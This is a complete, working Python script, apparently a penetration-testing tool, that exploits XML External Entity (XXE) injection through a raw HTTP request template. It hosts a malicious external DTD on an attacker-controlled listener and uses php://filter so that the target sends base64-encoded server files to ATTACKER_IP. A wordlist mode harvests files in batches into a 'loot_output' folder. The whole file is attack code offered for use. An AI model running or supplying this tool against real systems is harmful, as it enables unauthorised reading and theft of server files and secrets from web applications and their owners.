import os
import sys
import threading
import base64
import time
import requests
from urllib.parse import urlparse, parse_qs
from http.server import HTTPServer, BaseHTTPRequestHandler

# --- STATIC CONFIGURATION ---
REQ_FILE = "target.req"       # Path to your Burp/Raw request template

# --- DEBUGGING / PROXY CONFIGURATION ---
USE_PROXY = True
PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# Global runtime variables
ATTACKER_IP = ""
LPORT = 8081

# Global states for operational flow
current_file_path = ""
exfiltrated_data = None
data_received_event = threading.Event()

class DynamicXXEHandler(BaseHTTPRequestHandler):
    """
    Dynamically hosts the DTD template and captures incoming base64 streams
    """
    def do_GET(self):
        global exfiltrated_data, current_file_path
        parsed_url = urlparse(self.path)
        
        # 1. Target fetches external DTD
        if parsed_url.path == "/ext.dtd":
            self.send_response(200)
            self.send_header("Content-Type", "application/xml-dtd")
            self.end_headers()
            
            dtd_content = f'''<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={current_file_path}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{ATTACKER_IP}:{LPORT}/loot?data=%file;'>">
%eval;
%exfil;'''
            self.wfile.write(dtd_content.encode())
            
        # 2. Target sends base64 data back
        elif parsed_url.path == "/loot":
            query_components = parse_qs(parsed_url.query)
            if "data" in query_components:
                exfiltrated_data = query_components["data"]
                
            self.send_response(200)
            self.end_headers()
            data_received_event.set()
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        return  # Keeps console output clean

def parse_raw_request(filepath):
    """
    Parses a raw HTTP request file into structures compatible with requests.request()
    """
    if not os.path.exists(filepath):
        print(f"[-] Error: Request file '{filepath}' not found.")
        sys.exit(1)
        
    with open(filepath, "r", encoding="utf-8") as f:
        raw_text = f.read()

    if "\n\n" in raw_text:
        header_part, body_part = raw_text.split("\n\n", 1)
    elif "\r\n\r\n" in raw_text:
        header_part, body_part = raw_text.split("\r\n\r\n", 1)
    else:
        header_part = raw_text
        body_part = ""

    lines = header_part.splitlines()
    if not lines:
        print("[-] Error: Empty request file.")
        sys.exit(1)

    req_line = lines[0].split()
    if len(req_line) < 2:
        print("[-] Error: Invalid HTTP request line profile.")
        sys.exit(1)
    method, path = req_line[0], req_line[1]

    headers = {}
    host = ""
    is_https = False
    
    for line in lines[1:]:
        if ":" in line:
            key, val = line.split(":", 1)
            key = key.strip()
            val = val.strip()
            if key.lower() == "host":
                host = val
            elif key.lower() != "content-length":
                headers[key] = val
                
            if key.lower() == "x-forwarded-proto" and val.lower() == "https":
                is_https = True

    if not host:
        print("[-] Error: No 'Host' header found in request file.")
        sys.exit(1)
        
    proto = "https" if (is_https or ":443" in host) else "http"
    url = f"{proto}://{host}{path}"
    return method, url, headers, body_part

def send_xxe_payload(method, url, headers, body_template):
    """
    Inserts the XXE inline sequence into the request blueprint, fires it,
    and captures application responses or exceptions for troubleshooting.
    """
    xxe_injection = f'''<!DOCTYPE test [
    <!ENTITY % remote SYSTEM "http://{ATTACKER_IP}:{LPORT}/ext.dtd">
    %remote;
]>'''
    
    if "*XXE*" in body_template:
        final_body = body_template.replace("*XXE*", xxe_injection)
    else:
        final_body = xxe_injection + body_template

    try:
        req_kwargs = {
            "method": method,
            "url": url,
            "headers": headers,
            "data": final_body,
            "timeout": 5,
            "verify": False
        }
        if USE_PROXY:
            req_kwargs["proxies"] = PROXIES
            
        response = requests.request(**req_kwargs)
        
        if response.status_code >= 400:
            # Short notification; doesn't break mass processing layouts
            print(f" [!] Target application threw an error status: {response.status_code}")
            # Ensure the receiver doesn't wait endlessly if the request broke immediately
            data_received_event.set()
            
    except requests.exceptions.RequestException:
        data_received_event.set()

def start_server():
    server = HTTPServer(('0.0.0.0', LPORT), DynamicXXEHandler)
    server.serve_forever()

def process_single_file(file_path, method, url, headers, body_template):
    """
    Handles execution logic for a single given file path string.
    """
    global current_file_path, exfiltrated_data
    current_file_path = file_path
    exfiltrated_data = None
    data_received_event.clear()
    
    # Launch payload trigger in background
    trigger_thread = threading.Thread(
        target=send_xxe_payload, 
        args=(method, url, headers, body_template)
    )
    trigger_thread.start()
    
    # Wait up to 3 seconds for target response / DTD handshake loop execution
    completed = data_received_event.wait(timeout=3)
    
    if completed and exfiltrated_data:
        sanitized_path = current_file_path.replace(":", "").lstrip("/").lstrip("\\")
        local_path = os.path.join(os.getcwd(), "loot_output", sanitized_path)
        
        os.makedirs(os.path.dirname(local_path), exist_ok=True)
        
        missing_padding = len(exfiltrated_data) % 4
        if missing_padding:
            exfiltrated_data += '=' * (4 - missing_padding)
            
        try:
            decoded_bytes = base64.b64decode(exfiltrated_data)
            with open(local_path, "wb") as f:
                f.write(decoded_bytes)
            print(f"[+] Successfully extracted and saved: {current_file_path}")
            return True
        except Exception:
            print(f"[-] Base64 decoding corruption on stream for: {current_file_path}")
    else:
        print(f"[-] Failed to extract: {current_file_path} (Timeout/No Access)")
    return False

def main():
    global ATTACKER_IP, LPORT
    
    print("=" * 60)
    print("   PROFESSIONAL INTERACTIVE XXE EXFILTRATION HARNESS V2   ")
    print("=" * 60)
    
    ATTACKER_IP = input("[?] Enter your Attacker IP (e.g., tun0 IP): ").strip()
    if not ATTACKER_IP:
        print("[-] Attacker IP cannot be empty.")
        sys.exit(1)
        
    port_input = input("[?] Enter local listener port [Default 8081]: ").strip()
    if port_input:
        try:
            LPORT = int(port_input)
        except ValueError:
            print("[-] Invalid port number. Falling back to default: 8081")
            LPORT = 8081

    method, url, headers, body_template = parse_raw_request(REQ_FILE)
    print(f"\n[+] Loaded request profile target: {url} [{method}]")
    if USE_PROXY:
        print(f"[*] Debug proxy routing active -> {PROXIES['http']}")

    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()
    print(f"[*] Local DTD receiver serving actively on port {LPORT}...")

    print("\n[i] Tip: Type 'wordlist' to switch to multi-file dictionary mode.")

    while True:
        try:
            user_input = input("\nFile to extract (or wordlist / exit): ").strip()
            if not user_input:
                continue
            if user_input.lower() == 'exit':
                break
                
            # --- WORDLIST SCANNING MODE ---
            if user_input.lower() == 'wordlist':
                wlist_path = input("[?] Enter path to your local wordlist file: ").strip()
                if not os.path.exists(wlist_path):
                    print("[-] Error: Wordlist file path does not exist.")
                    continue
                    
                with open(wlist_path, "r", encoding="utf-8") as wl:
                    target_paths = [line.strip() for line in wl if line.strip()]
                
                print(f"[*] Initiating batch exfiltration against {len(target_paths)} assets...")
                success_count = 0
                
                for path in target_paths:
                    print(f"[*] Requesting asset sequence -> {path}")
                    if process_single_file(path, method, url, headers, body_template):
                        success_count += 1
                    time.sleep(0.5) # Soft delay to stabilize connections between loops
                    
                print(f"\n[+] Batch scan complete. Successfully harvested {success_count}/{len(target_paths)} files.")
                
            # --- SINGLE FILE MODE ---
            else:
                process_single_file(user_input, method, url, headers, body_template)
                
        except KeyboardInterrupt:
            print("\n[-] Shutting down threads cleanly.")
            sys.exit(0)

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    main()
